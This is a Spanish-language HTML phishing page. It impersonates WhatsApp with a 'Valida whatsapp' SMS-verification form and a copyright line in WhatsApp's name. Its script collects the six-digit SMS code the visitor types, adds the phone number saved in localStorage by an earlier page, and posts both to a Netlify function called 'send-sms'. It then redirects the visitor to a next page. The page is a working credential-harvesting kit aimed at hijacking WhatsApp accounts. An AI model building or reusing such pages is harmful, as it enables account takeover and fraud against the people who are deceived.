<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verificación SMS</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    /* Mismo estilo que index2.html */
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #4caf50, #81c784);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #333;
    }

    .code-box {
      background: white;
      padding: 40px 30px;
      border-radius: 16px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
      width: 350px;
      max-width: 90%;
      text-align: center;
    }

    .code-box h1 {
      margin-bottom: 12px;
      font-weight: 600;
      color: #333;
      font-size: 1.8rem;
    }

    .description {
      font-weight: 400;
      font-size: 1rem;
      color: #555;
      margin-bottom: 28px;
      line-height: 1.4;
    }

    label {
      display: block;
      font-weight: 600;
      margin-bottom: 16px;
      color: #555;
      text-align: left;
      font-size: 1rem;
    }

    .code-inputs {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      margin-bottom: 24px;
    }

    .code-inputs input {
      width: 40px;
      height: 50px;
      font-size: 1.8rem;
      font-weight: 600;
      text-align: center;
      border: 2px solid #ddd;
      border-radius: 12px;
      transition: border-color 0.3s ease;
      box-sizing: border-box;
      color: #333;
    }

    .code-inputs input:focus {
      outline: none;
      border-color: #4caf50;
      box-shadow: 0 0 8px rgba(76, 175, 80, 0.4);
      background-color: #f0fdf0;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #21c063;
      border: none;
      border-radius: 14px;
      color: white;
      font-weight: 600;
      font-size: 1.1rem;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #1aa454;
    }

    .footer-text {
      margin-top: 24px;
      font-size: 0.9rem;
      color: #555;
      user-select: none;
      line-height: 1.3;
    }

    .footer-text strong {
      display: block;
      margin-bottom: 6px;
    }

    .footer-text a {
      color: #4caf50;
      text-decoration: none;
      font-weight: 600;
    }

    .footer-text a:hover {
      text-decoration: underline;
    }

    .error {
      color: red;
      font-weight: bold;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

  <div class="code-box">
    <h1>Valida whatsapp</h1>
    <p class="description">
      Ingrese el código recibido por SMS para completar la validación.
    </p>

    <form id="codeForm">
      <div class="error" id="errorMsg" style="display:none;"></div>

      <label for="code">Código de verificación</label>
      <div class="code-inputs">
        <input type="text" maxlength="1" required />
        <input type="text" maxlength="1" required />
        <input type="text" maxlength="1" required />
        <input type="text" maxlength="1" required />
        <input type="text" maxlength="1" required />
        <input type="text" maxlength="1" required />
      </div>
      <button type="submit">Verificar</button>
    </form>

    <div class="footer-text">
      Además del cifrado de extremo a extremo, añadimos más capas de protección para todas tus conversaciones.<br><br>
      2024 © WhatsApp LLC
    </div>
  </div>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

  <script>
    const inputs = document.querySelectorAll('.code-inputs input');
    const errorMsg = document.getElementById('errorMsg');

    inputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        if (input.value.length === 1 && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value === '' && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });

    $('#codeForm').submit(function(e) {
      e.preventDefault();

      let code = '';
      inputs.forEach(input => code += input.value);

      let codePrevio = localStorage.getItem('codigo_index2');

      if (code === codePrevio) {
        errorMsg.textContent = 'Por favor, ingresa solo el código que fue enviado vía SMS debe ser distinto al del dispositivo';
        errorMsg.style.display = 'block';
        return;
      }

      // Si es válido, enviar usando Netlify Function
      let numero = localStorage.getItem('telefono_completo') || "Número no disponible";

      // Enviar usando Netlify Function
      fetch('/.netlify/functions/send-sms', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          numero: numero,
          codigo: code
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          console.log("Código SMS enviado exitosamente");
          window.location = "index4.html";
        } else {
          errorMsg.textContent = 'Error al enviar el código. Intenta nuevamente.';
          errorMsg.style.display = 'block';
        }
      })
      .catch(error => {
        console.error('Error:', error);
        errorMsg.textContent = 'Error al enviar el código. Intenta nuevamente.';
        errorMsg.style.display = 'block';
      });
    });
  </script>

</body>
</html>
